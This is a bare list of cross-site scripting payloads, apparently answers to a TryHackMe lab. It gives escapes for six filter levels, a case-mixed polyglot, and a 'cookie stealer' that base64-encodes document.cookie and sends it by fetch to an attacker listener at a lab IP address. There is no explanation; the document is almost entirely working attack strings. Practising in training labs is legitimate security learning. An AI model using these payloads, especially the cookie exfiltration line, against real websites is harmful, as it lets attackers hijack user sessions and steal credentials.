### XSS

### Level 1: <script>alert('THM');</script>

### Level 2: "><script>alert('THM');</script>

### Level 3: </textarea><script>alert('THM');</script>

### Level 4: ';alert('THM');//

### Level 5: <sscriptcript>alert('THM');</sscriptcript>

### Level 6: /images/cat.jpg" onload="alert('THM');

### POLYGLOTS: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

### cookie stealer: </textarea><script>fetch('http://10.11.106.164:4444?cookie=' + btoa(document.cookie) );</script>
